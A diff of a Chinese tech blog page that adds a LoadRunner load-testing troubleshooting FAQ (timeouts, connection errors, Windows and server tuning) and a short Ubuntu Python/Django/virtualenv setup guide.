+<h2 id="在LoadRunner脚本如何输出当前系统时间?">在LoadRunner脚本如何输出当前系统时间?</h2><p>LoadRunner提供了char <em>ctime(const time_t </em>time)函数，调用参数为一个Long型的整数指针，用于存放返回时间的数值表示.<br>调用语句与返回值如下示例：<br>　　<br>    typedef long time_t;<br>　　Action()<br>　　{<br>　　time_t t;<br>　　lr_message(“Time in seconds since 1/1/70: %ld\n”,time(&amp;t));<br>　　lr_message(“System time and date: %s”,ctime(&amp;t));<br>　　}<br>　　输出结果为：<br>　　Time in seconds since 1/1/70: 1185329968<br>　　System time and date:Wed Jul 25 10:19:28 2007<br>　　<br>一些Web虚拟用户脚本录制后立刻回放没有任何问题，但是当设置迭代次数大于1时，如果进行回放则只能成功迭代一次.</p>
+<h2 id="为什么从第二次迭代开始发生错误?">为什么从第二次迭代开始发生错误?</h2><p>这种现象多是由于在“Run-time Setting”的“Browse Emulation”的设置中，勾选了“Simulate a new user on each iteration”及其下面的选项“Clear cache on each iteration”这两个选项的含义是每次迭代时模拟一个新的用户及每次迭代时清除缓存.<br>由于脚本迭代时，init和end只能执行一次，如果每次迭代都模拟一个新的用户并清除缓存，则用户登录信息将一并清除，因此迭代时可能会发生错误.</p>
+<h2 id="虚拟客户脚本“Run-time_Setting”中的线程和进程运行方式的区别?">虚拟客户脚本“Run-time Setting”中的线程和进程运行方式的区别?</h2><p>如果选择“Run Vuser as a process”，则场景运行时会为每一个虚拟用户创建一个进程;选择“Run Vuser as a thread”则将每个虚拟用户作为一个线程来运行，在任务管理器中只看到一个mmdrv.exe，这种方式的运行效率更高，能造成更大的压力，时默认选项.<br>另外，如果启用了IP欺骗功能，则先在Controller中选中Tools菜单下的“Expert Mode”，然后将Tools菜单下的“Options&gt;General”标签页中的IP地址分配方式也设置为与Vuser运行方式一致，同为线程或进程方式.</p>
+<h2 id="在Controller中运行Web相关测试场景时，经常会有很多超时错误提示，如何处理这类问题?">在Controller中运行Web相关测试场景时，经常会有很多超时错误提示，如何处理这类问题?</h2><p>这主要有脚本的默认超时设置引起.当回放Web脚本时，有时候由于服务器响应时间较长，会产生超时的错误.这时需要修改脚本的运行时配置.<br>进入“Run-time Setting”对话框后，依次进入“Internet Protocol→Preference”.然后点击“Options…”按钮，进入高级设置对话框，可以修改各类超时设置的默认值.</p>
+<h2 id="为什么Windows系统中的CPU内存等资源仍然充足，但是模拟的用户数量却上不去?">为什么Windows系统中的CPU内存等资源仍然充足，但是模拟的用户数量却上不去?</h2><p>在Windows计算机的标准设置下，操作系统的默认限制只能使用几百个Vuser，这个限制与CPU或内存无关，主要是操作系统本身规定了默认的最大线程数所导致.要想突破Windows这个限制，须修改Windows注册表.以Windows XP Professional为例.<br>　　<br>    (1)打开注册表后，进入注册表项HKEY_LOCAL_MACHINE中的下列关键字：System\CurrentControlSet\Control\Session Manager\SubSystems.<br>　　(2)找到Windows关键字，Windows关键字如下所示：<br>　　%SystemRoot%\system32\csrss.exe bjectDirectory=\Windows<br>　　SharedSection=1024,3072,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1<br>　　ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2<br>　　ProfileControl=Off MaxRequestThreads=16<br>　　SharedSection=1024,3072,512关键字的格式为xxxx,yyyy,zzz.其中，xxxx定义了系统范围堆的最大值(以KB为单位)    ，yyyy定义每个桌面堆得大小.<br>    (3)将yyyy的设置从3072更改为8192(即8MB)，增加SharedSection参数值.<br>　　<br>通过对注册表的更改，系统将允许运行更多的线程，因而可以在计算机上运行更多的Vuser.这意味着能够模拟的最大并发用户数量将不受Windows操作系统的限制，而只受硬件和内部可伸缩性限制的约束.</p>
+<h2 id="录制脚本为空">录制脚本为空</h2><p>1.LR录制是客户端与服务器的数据交互，只有在有交互的时候才可以录制到脚本.<br>1）交互方式不一样，通过客户端的server进行交互，在scrīpt中选择最后一个track processes created as COM local servers  [选择scrīpt里的最后一个选项].</p>
+<ol>
+<li>非客户端与服务器的交互的一种操作，在页面上点前进或后退，如果页面是从缓存中取出来的，那么也就没有和服务器数据交互，所以也录制的为空脚本.   [windows注册表中禁用缓存]. </li>
+<li>协议选择错误，b/s不一定走http协议，还可能是https（http+ssl）.[最基础的错误].录制出错.<br>2）选择internet里选项里的连接里的局域网设置的代理不能选，因为LR在录制的时候会动态选择.<br>3）网页里的恶意代码，检测的时候响应LR录制脚本[用工具检测恶意代码，然后卸载恶意代码，eg：Ad_Aweare].<br>4）防病毒软件和防火墙，在录制时暂时关闭.<br>5）因为LR自身原因报错或者有些脚本不能录制下来[录制是最好选用scrīpt view，此时会报错，但能写下脚本，是因为LR无法解析，可以手工修改，而tree view 就直接停止了.<br>　<br>Loadrunner不支持默认的浏览器</li>
+</ol>
+<hr>
+<p>有时候，我们上网的时候，不小心会将某个浏览器设置为默认的浏览器，而我们不知道，这个时候，我们用loadrunner进行录制的时候，会提示loadrunner不支持系统设置的默认的浏览器，因此，需要我们重新选择浏览器，我们可以利用Reconding optiom中的Browser选项设置支持的浏览器，我们还可以利用下面的方法，将IE设置为默认的浏览器，因为loadrunner是支持IE的.设置方法如下：<br>在IE“工具（T）”菜单→“Interner选项”→“程序”选项卡里，确保“检查Internet Explorer是否为默认的浏览器”选项打上√.然后在你启动IE时，如果IE非默认浏览器就会出现提示窗是否把IE设置为默认.</p>
+<h2 id="Step_download_timeout_(120_seconds)">Step download timeout (120 seconds)   </h2><p>这是一个经常会遇到的问题，解决得办法走以下步骤：<br>1修改run time setting中的请求超时时间，增加到600s,其中有三项的参数可以一次都修改了，HTTP-request connect timeout，HTTP-request receieve timeout，Step download timeout，分别建议修改为6006005000.run time setting设置完了后记住还需要在control组件的option的run time setting中设置相应的参数.<br>2办法一不能解决的情况下，解决办法如下：<br>设置runt time setting中的internet protocol-preferences中的advaced区域有一个winlnet replay instead of sockets选项，选项后再回放就成功了.切记此法只对windows系统起作用，此法来自zee的资料.    </p>
+<h2 id="问题描述Connection_reset_by_peer-">问题描述Connection reset by peer.   </h2><p>这个问题不多遇见，一般是由于下载的速度慢，导致超时，所以，需要调整一下超时时间.<br>解决办法：Run-time setting窗口中的‘Internet Protocol’－‘Preferences’设置set advanced options（设置高级选项），重新设置一下“HTTP-request connect timeout（sec），可以稍微设大一些”.    </p>
+<h2 id="问题描述connection_refused">问题描述connection refused  </h2><p>这个的错误的原因比较复杂，也可能很简单也可能需要查看好几个地方，解决起来不同的操作系统方式也不同.<br>1首先检查是不是连接weblogic服务过大部分被拒绝，需要监控weblogic的连接等待情况，此时需要增加acceptBacklog，每次增加25%来提高看是否解决，同时还需要增加连接池和调整执行线程数，（连接池数*Statement Cache Size）的值应该小于等于oracle数据库连接数最大值.<br>2如果方法一操作后没有变化，此时需要去查看服务器操作系统中是否对连接数做了限制，AIX下可以直接vi文件limits修改其中的连接限制数端口数，还有tcp连接等待时间间隔大小，wiodows类似，只不过windows修改注册表，具体修改注册表中有TcpTimedWaitDelay和MaxUserPort项，键值在[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters].因为负载生成器的性能太好，发数据包特别快，服务器也响应特别快，从而导致负载生成器的机器的端口在没有timeout之前就全部占满了.在全部占满后，就会出现上面的错误.执行netstat –na命令，可以看到打开了很多端口.所以就调整TCP的time out.即在最后一个端口还没有用到时，前面已经有端口在释放了.<br>1,这里的TcpTimedWaitDelay默认值应该中是30s，所以这里，把这个值调小为5s（按需要调整）.<br>2,也可以把MaxUserPort调大（如果这个值不是最大值的话）.    </p>
+<h2 id="问题描述open_many_files">问题描述open many files </h2><p>问题一般都在压力较大的时候出现，由于服务器或者应用中间件本身对于打开的文件数有最大值限制造成，解决办法：<br>1修改操作系统的文件数限制，aix下面修改limits下的nofiles限制条件，增大或者设置为没有限制，尽量对涉及到的服务器都作修改.<br>2方法一解决不了情况下再去查看应用服务器weblogic的commonEnv.sh文件，修改其中的nofiles文件max-nofiles数增大，应该就可以通过了，具体就是查找到nofiles方法，修改其中else条件的执行体，把文件打开数调大.修改前记住备份此文件，防止修改出错.<br>3linux上可以通过ulimit –HSn 4096来修改文件打开数限制，也可以通过ulimit -a 来查看.<br>4linux上可以通过lsof -p pid | wc -l 来查看进程打开的句柄数.    </p>
+<h2 id="问题描述has_shut_down_the_connection_prematurely">问题描述has shut down the connection prematurely  </h2><p>一般是在访问应用服务器时出现，大用户量和小用户量均会出现.<br>来自网上的解释：<br>1&gt;应用访问死掉<br>小用户时：程序上的问题.程序上存在数据库的问题<br>2&gt;应用服务没有死<br>应用服务参数设置问题<br>例如：<br>在许多客户端连接Weblogic应用服务器被拒绝，而在服务器端没有错误显示，则有可能是Weblogic中的server元素的AcceptBacklog属性值设得过低.如果连接时收到connection refused消息，说明应提高该值，每次增加25％<br>Java连接池的大小设置，或JVM的设置等<br>3&gt;数据库的连接<br>在应用服务的性能参数可能太小了<br>数据库启动的最大连接数（跟硬件的内存有关）<br>以上信息有一定的参考价值，实际情况可以参考此类调试.<br>如果是以上所说的小用户时：程序上的问题.程序上存在数据库的问题，那就必须采用更加专业的工具来抓取出现问题的程序，主要是程序中执行效率很低的sql语句，weblogic可以采用introscope定位，期间可以注意观察一下jvm的垃圾回收情况看是否正常，我在实践中并发500用户和600用户时曾出现过jvm锯齿型的变化，上升下降都很快，这应该是不太正常的.<br>实际测试中，可以用telent 站点看看是否可以连接进去，可以通过修改连接池中的连接数和适当增加应用内存值，问题可以解决.    </p>
+<h2 id="问题描述Failed_to_connect_to_server">问题描述Failed to connect to server   </h2><p>这个问题一般是客户端链接到服务失败，原因有两个客户端连接限制（也就是压力负载机器），一个网络延迟严重，解决办法：<br>1修改负载机器注册表中的TcpTimedWaitDelay减小延时和MaxUserPort增加端口数.注：这将增加机器的负荷.<br>2检查网络延迟情况，看问题出在什么环节.<br>  建议为了减少这种情况，办法一最好测试前就完成了，保证干净的网络环境，每个负载机器的压力测试用户数不易过大，尽量平均每台负载器的用户数，这样以上问题出现的概率就很小了.   </p>
+<h2 id="问题描述Overlapped_transmission_of_request_to_…_WSA_IO_PENDING">问题描述Overlapped transmission of request to … WSA_IO_PENDING   </h2><p>这个问题，解决方法：<br> 1方法一，在脚本前加入web_set_sockets_option(“OVERLAPPED_SEND”, “0”)，禁用TTFB细分，问题即可解决，但是TTFB细分图将不能再使用，附图.<br>2方法二，可以通过增加连接池和应用系统的内存，每次增加25%.   </p>
+<h2 id="问题描述Deleted_the_current_transaction_…_since_response_time_is_not_accurate">问题描述Deleted the current transaction … since response time is not accurate </h2><p>这个问题不多遇见，一般出现在压力机器上发生ping值为负数（AMD双核CPU），可以重新启动pc机或者打补丁，附图.   </p>
+<h2 id="问题描述HTTP_Status-Code=500_(Internal_Server_Error)_for">问题描述HTTP Status-Code=500 (Internal Server Error) for  </h2><p>1应用服务当掉，重新启动应用服务.<br>2当应用系统处于的可用内存处于阀值以下时，出现HTTP Status-Code=500的概率非常高，此时只要增加应用系统的内存，问题即可解决.    </p>
+<h2 id="问题描述Failed_to_transmit_data_to_network:_[10057]Socket_is_not_connected">问题描述Failed to transmit data to network: [10057]Socket is not connected</h2><p>这个错误是由网络原因造成的，PC1和PC2上面都装了相同的loadrunner 9.0，且以相同数量的虚拟用户数运行相同的业务（机器上的其他条件都相同），PC1上面有少部分用户报错，PC2上的用户全部执行通过.   </p>
+<h2 id="问题描述_Error_-27257:_Pending_web_reg_save_param/reg_find/create_html_param[_ex]_request(s)_detected_and_reset_at_the_end_of_iteration_number_1">问题描述 Error -27257: Pending web_reg_save_param/reg_find/create_html_param[_ex] request(s) detected and reset at the end of iteration number 1  </h2><p>解决方法：web_reg_save_param位置放错了，应该放到请求页面前面. </p>
+<h2 id="问题描述_通过Controler调用远程代理时报错，Error:_CCI_security_error:You_are_running_under_secure_mode_and_the_function_system_is_not_allowed_in_this_mode-">问题描述 通过Controler调用远程代理时报错，Error: CCI security error:You are running under secure mode and the function system is not allowed in this mode.  </h2><p>解决方法：在代理开启的时候，去掉勾选防火墙选项.   </p>
+<h2 id="LoadRunner超时错误：">LoadRunner超时错误：</h2><p>在录制Web协议脚本回放时超时情况经常出现，产生错误的原因也有很多，解决的方法也不同.<br>错误现象1：Action.c(16): Error -27728: Step download timeout (120 seconds) has expired when downloading non-resource(s).<br>错误分析：对于HTTP协议，默认的超时时间是120秒（可以在LoadRunner中修改），客户端发送一个请求到服务器端，如果超过120秒服务器端还没有返回结果，则出现超时错误.<br>解决办法：首先在运行环境中对超时进行设置，默认的超时时间可以设置长一些，再设置多次迭代运行，如果还有超时现象，需要在“Runtime Setting”&gt;“Internet Protocol：Preferences”&gt;“Advanced”区域中设置一个“winlnet replay instead of sockets”选项，再回放是否成功.<br>错误现象2：Action.c(81):Continuing after Error -27498: Timed out while processing URL=<a href="http://172.18.20.70:7001/workflow/bjtel/leasedline/" target="_blank" rel="external">http://172.18.20.70:7001/workflow/bjtel/leasedline/</a> querystat/ subOrderQuery.do<br>错误分析：这种错误常常是因为并发压力过大，服务器端太繁忙，无法及时响应客户端的请求而造成的，所以这个错误是正常现象，是压力过大造成的.<br>如果压力很小就出现这个问题，可能是脚本某个地方有错误，要仔细查看脚本，提示的错误信息会定位某个具体问题发生的位置.<br>解决办法：例如上面的错误现象问题定位在某个URL上，需要再次运行一下场景，同时在其他机器上访问此URL.如果不能访问或时间过长，可能是服务器或者此应用不能支撑如此之大的负载.分析一下服务器，最好对其性能进行优化.<br>如果再次运行场景后还有超时现象，就要在各种图形中分析一下原因，例如可以查看是否服务器DNS网络等方面存在问题.<br>最后，增加一下运行时的超时设置，在“Run-Time Settings”&gt;“Internet Protocol:Preferences”中，单击“options”，增加“HTTP-request connect timeout”或者“HTTP-request receive”的值.   </p>
+<h2 id="LoadRunner脚本中出现乱码：在录制Web协议脚本时出现中文乱码，在回放脚本时会使回放停止在乱码位置，脚本无法运行-">LoadRunner脚本中出现乱码：在录制Web协议脚本时出现中文乱码，在回放脚本时会使回放停止在乱码位置，脚本无法运行.   </h2><p>错误现象：某个链接或者图片名称为中文乱码，脚本运行无法通过.<br>错误分析：脚本录制可能采用的是URL-based script方式，如果程序定义的字符集合采用的是国际标准，脚本就会出现乱码现象.<br>解决办法：重新录制脚本，在录制脚本前，打开录制选项配置对话框进行设置，在“Recording Options”的“Advanced”选项里先将“Surport Charset”选中，然后选中支持“UTF-8”的选项.   </p>
+<h2 id="LoadRunner">LoadRunner</h2><p> HTTP服务器状态代码：在录制Web协议脚本回放脚本的过程中，会出现HTTP服务器状态代码，例如常见的页面-404错误提示-500错误提示.<br>错误现象1：-404 Not Found服务器没有找到与请求URI相符的资源，但还可以继续运行直到结束.<br>错误分析：此处与请求URI相符的资源在录制脚本时已经被提交过一次，回放时不可再重复提交同样的资源，而需要更改提交资源的内容，每次回放一次脚本都要改变提交的数据，保证模拟实际环境，造成一定的负载压力.<br>解决办法：在出现错误的位置进行脚本关联，在必要时插入相应的函数.<br>错误现象2：-500 Internal Server Error服务器内部错误，脚本运行停止.<br>错误分析：服务器碰到了意外情况，使其无法继续回应请求.<br>解决办法：出现此错误是致命的，说明问题很严重，需要从问题的出现位置进行检查，此时需要此程序的开发人员配合来解决，而且产生的原因根据实际情况来定，测试人员无法单独解决问题，而且应该尽快解决，以便于后面的测试.   </p>
+<p>LoadRunner请求无法找到：在录制Web协议脚本回放脚本的过程中，会出现请求无法找到的现象，而导致脚本运行停止.</p>
+<hr>
+<p>错误现象：Action.c(41): Error -27979: Requested form. not found [MsgId: MERR-27979]<br> Action.c(41): web_submit_form. highest severity level was “ERROR”,0 body bytes, 0 header bytes [MsgId: MMSG-27178]”<br>这时在tree view中看不到此组件的相关URL.<br>错误分析：所选择的录制脚本模式不正确，通常情况下，基于浏览器的Web应用会使用“HTML-based script”模式来录制脚本；而没有基于浏览器的Web应用Web应用中包含了与服务器进行交互的Java Applet基于浏览器的应用中包含了向服务器进行通信的JavaScript/VBScript代码基于浏览器的应用中使用HTTPS安全协议，这时则使用“URL-based script”模式进行录制.<br>解决办法：打开录制选项配置对话框进行设置，在“Recording Options”的“Internet Protocol”选项里的“Recording”中选择“Recording Level”为“HTML-based script”，单击“HTML Advanced”，选择“Script. Type”为“A script. containing explicit”.然后再选择使用“URL-based script”模式来录制脚本.   </p>
+<h2 id="LoadRunner不执行检查方法：在录制Web协议脚本中添加了检查方法Web_find，但是在脚本回放的过程中并没有执行-">LoadRunner不执行检查方法：在录制Web协议脚本中添加了检查方法Web_find，但是在脚本回放的过程中并没有执行.   </h2><p>错误现象：在脚本中插入函数Web_find，在脚本中设置文本以及图像的检查点，但是在回放过程中并没有对设置的检查点进行检查，即Web_find失效.<br>错误分析：由于检查功能会消耗一定的资源，因此LoadRunner默认关闭了对文本以及图像的检查，所以在设置检查点后，需要开启检查功能.<br>解决办法：打开运行环境设置对话框进行设置，在“Run-time Settings”的“Internet Protocol”选项里的“Perference”中勾选“Check”下的“Enable Image and text check”选项.   </p>
+<h2 id="LoadRunner回放Web_Services协议脚本错误：">LoadRunner回放Web Services协议脚本错误：</h2><p>LoadRunner 8.0版本在录制Web Services协议的脚本时正常，但在回放时会出现错误，提示停止脚本运行.<br>错误现象：利用LoadRunner 8.0版本来录制Web Services协议的脚本没有任何错误提示，回放脚本时会出现如下错误提示“Error：server returned an incorrectly formatted SOAP response”.<br>错误分析：出现此错误的原因是LoadRunner8.0在录制Web Services协议的脚本时存在一个缺陷：如果服务器的操作系统是中文的，VuGen会自动将WSDL文件的头改为</p>
+<pre><code><span class="pi">&lt;?xml version=”1.0″encoding=”zh_cn” ?&gt;</span>，所以才会有此错误提示.   
+</code></pre><p>解决办法：下载两个补丁，分别为“LR80WebServicesFPI_setup.exe”和“lrunner<em>web</em> services_patch_1.exe”安装上即可. </p>
+<h2 id="error:missing_newline_in_d:\loadrunner\name-dat">error:missing newline in d:\loadrunner\name.dat   </h2><p>场景执行时报error:missing newline in d:\loadrunner\name.dat<br>第二次执行不报<br>两个解决办法：<br>第一：如果参数不是很多的话，不要打开记事本去编辑参数，就直接在LR提供的参数的表格中进行编辑即可.<br>第二：如果参数很多超过100条的话.在记事本中编辑好了之后，记着在最后一个参数后打个回车，让鼠标的光标移动到下一行.  </p>
+<h2 id="load_generator_is_currently_running_the_maximum_number_of_vuser_of_this_type">load generator is currently running the maximum number of vuser of this type   </h2><p>使用的是loadrunner8.0，有10000个用户的web的license，global的有10个.<br>在测试的时候发现running vuser到达1000以后就不能再提高，后面的vuser就会出错.错误是“The load generator is currently running the maximum number of vuser of this type”.<br>已经可以排除是load generator机器本身资源的问题.因为换了性能比较强的酷睿2还是同样的问题，CPU和memory都有空闲.<br>解决办法:   </p>
+<pre><code>在<span class="built_in">load</span> generator中有一个V<span class="keyword">user</span> limits tab，可以设置running <span class="keyword">user</span>的最大数目. 即设置 <span class="built_in">load</span> generator----Details------V<span class="keyword">user</span> limits ----Other Vusers 的最大参数   
+</code></pre><h2 id="sofeware_caused_connction：">sofeware caused connction：</h2><p>这种情况，一般是脚本有问题，或者loadrunner有问题.解决方法：重新启动机器，或者重新录制脚本，估计是loadrunner的bug.   </p>
+<h2 id="cannot_connect_to_server:">cannot connect to server:</h2><p>无法连接到服务器.这种情况是服务器的配置有问题，服务器无法承受过多的并发连接了.需要优化服务器的配置，<br>如操作系统采用windows 2003 server，<br>优化tomcat配置：maxThreads=”500” minSpareThreads=”400” maxSpareThreads=”450”.但是tomcat 最多支持500个并发访问<br>优化apache配置：<br>ThreadsPerChild 1900<br>MaxRequestsPerChild 10000<br>其他的错误如：<br>Action.c(10): Error -27791: Server has shut down the connection prematurely<br>HTTP Status-Code=503 (Service Temporarily Unavailable)<br>一般都是由于服务器配置不够好引起的，按照问题（2）处理，如果仍旧不行，需要优化硬件和调整程序了.   </p>
+<h2 id="Controller中设置了用户并发数量，但是运行时为何初始化的用户数量少于实际数量？">Controller中设置了用户并发数量，但是运行时为何初始化的用户数量少于实际数量？</h2><p>主要时设置问题.在Tools→options→Run-time setting中可以设置每次最多初始化的虚拟用户.如果需要100个并发用户，则将该值设置为大于100的数值.另外，注意LoadRunner相关协议License的更新，确保使用的License能够允许所需要的并发用户数量.</p>
+<h2 id="如何让场景的用户执行发生错误继续运行，以保证不间断进行压力测试？">如何让场景的用户执行发生错误继续运行，以保证不间断进行压力测试？</h2><p>用VuGen打开虚拟用户脚本后，进入”Run-time Settings”对话框后，依次进入”General→Miscellaneous”，可以看到Miscellaneous设置中关于”Error Handling”的配置.勾选”Continue on error”即可让虚拟用户发生错误继续运行.</p>
+<h2 id="为什么-NET虚拟用户有时不能在远程主机执行？">为什么.NET虚拟用户有时不能在远程主机执行？</h2><p>主要时LoadRunner的版本问题.根据笔者的经验，如果是Microsoft Visual Studio 2005开发的虚拟用户，同时LoadRunner客户端的版本低于8.1，执行Controller的主机将会发生错误.<br>因此要想正确的运行Microsoft Visual Studio 2005开发的.NET虚拟用户，客户端最好装8.1以上的版本，Controller的主机则安装8.0和8.1两个版本均可.此外，产生压力的 LoadRunner客户端上预先应该安装.NET运行环境，如果Microsoft Visual Studio 2005开发的是.NET虚拟用户，则应该安装Microsoft .NET Framework SDK v2.0.</p>
+<h2 id="测试分析结果中会统计Action时间，而实际上可能并不须要这些数据，如何只显示自己定义的用户事务？">测试分析结果中会统计Action时间，而实际上可能并不须要这些数据，如何只显示自己定义的用户事务？</h2><p>进入脚本的运行时设置，依次进入General→Miscellaneous.默认情况下，自动事务配置”Automatic Transactions”下有两个选项：第一个是把脚本的Action部分定义为一个事务；第二个时把脚本的每一部分定义为一个事务.去掉这两个勾选后，测试结果将会只显示自己定义的用户事务.</p>
+<h2 id="测试结果中，Summary和平均事务响应时间图里的各个事务的最大值平均值最小值为什么显示不一样？">测试结果中，Summary和平均事务响应时间图里的各个事务的最大值平均值最小值为什么显示不一样？</h2><p>主要是受采样时间的影响.Summary里的事务平均响应时间是根据整个场景执行过程得到的数据计算所得，最大值与最小值也是从整个场景中得到的.平均事务响应时间图主要时按照LoadRunner分析出来的采样频率来获取事务响应时间的最大值与最小值，然后计算平均值.可以通过”Set Granularity”来修改平均事务响应时间图的采样频率.如果把”Granularity”设为场景执行时间，则统计结果将会一致.</p>
+<h2 id="统计结果中的总点击量Total_Hits时用户的鼠标点击次数吗？">统计结果中的总点击量Total Hits时用户的鼠标点击次数吗？</h2><p>Total Hits不时按照用户的鼠标点击次数来计算的，而是按照各个虚拟客户端向后台发起的总的请求数来进行统计的.例如在向服务器请求的一个页面中，如果该页面包含5个图片，用户只要单击鼠标就可以访问该页面，而单个虚拟用户在LoadRunner访问的点击量为1+5=6次.</p>
+<h2 id="有些Web测试结果分析图（例如每秒返回页面数）在测试结果分析图中无法看到，如何进行配置？">有些Web测试结果分析图（例如每秒返回页面数）在测试结果分析图中无法看到，如何进行配置？</h2><p>用VuGen打开虚拟用户脚本后，进入”Run-time Settings”对话框后，依次进入”Internet Protocol&gt;Preference”，可以看到一些Web性能图配置.<br>勾选上面得选项后，Controller将会在测试执行过程中生成数据，然后可在Analysis中查看相应的性能结果分析图.</p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              <a class="post-title-link" href="/2015/08/10/ubuntu下python-django环境搭建/" itemprop="url">
+                ubuntu下python+django环境搭建
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-08-10T13:09:36+08:00" content="2015-08-10">
+            2015-08-10
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/08/10/ubuntu下python-django环境搭建/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/10/ubuntu下python-django环境搭建/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><h2 id="一，首先列出需要安装的东西：">一，首先列出需要安装的东西：</h2><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>说明</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>python2.7</td>
+<td>这个安装就不用多说了linux都会自带的</td>
+</tr>
+<tr>
+<td>easy_install</td>
+<td>一个能安装python工具的命令</td>
+<td><code>sudo apt-get install python-setuptools</code></td>
+</tr>
+<tr>
+<td>pip</td>
+<td>python包管理工具</td>
+<td><code>sudo easy install pip</code></td>
+</tr>
+<tr>
+<td>git</td>
+<td>版本管理工具实现多人合作开发</td>
+<td><code>sudo apt-get install git</code></td>
+</tr>
+<tr>
+<td>django</td>
+<td>项目开发框架（建议先不要安装在全局）</td>
+<td><code>sudo easy install django</code></td>
+</tr>
+<tr>
+<td>virtualenv</td>
+<td>提供一个用于开发的模拟环境</td>
+<td><code>sudo easy installvirtualenv</code></td>
+</tr>
+<tr>
+<td>sublime</td>
+<td>编辑器                                     </td>
+</tr>
+</tbody>
+</table>
+<h2 id="二，使用virtualenv建立虚拟开发环境"> 二，使用virtualenv建立虚拟开发环境</h2><p>转到开发目录（cd filename / 打开filename  cd ..  /后退   mkdir filename/ 创建名为filename的文件）用到的3基本个命令<br>执行命令：virtualenvenv                   #创建名为env的环境<br>执行命令：source env/bin/activate   #进入env环境    这时命令行前面会有（env）这个标志<br>执行命令：pipfreeze                          #查看当前env目录下安装包的情况 正常情况下是什么都没有 或是默认安装几个重要包<br>执行命令：pip install django                #安装djangodjango框架安装在env环境中<br>再次执行：pip freeze                          #会发现多了一个django</p>
+<h2 id="三，使用django创建一个工程">三，使用django创建一个工程</h2><p>执行命令：django-admin.py startproject mysite #创建一个名为mysite的django工程<br>进入mysite目录：cd mysite<br>执行命令：python manage.py runserver<br>在浏览器地址栏输入：<a href="http://127.0.0.1:8000/" target="_blank" rel="external">http://127.0.0.1:8000/</a>      #会发现它已经在工作了</p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
   </section>
 
   
@@ -1459,7 +1568,7 @@ mysql&gt; alter table admin renanme admin5<span class="comment">;//重命名表<
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">39</span>
+              <span class="site-state-item-count">35</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1473,7 +1582,7 @@ mysql&gt; alter table admin renanme admin5<span class="comment">;//重命名表<
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">37</span>
+              <span class="site-state-item-count">33</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
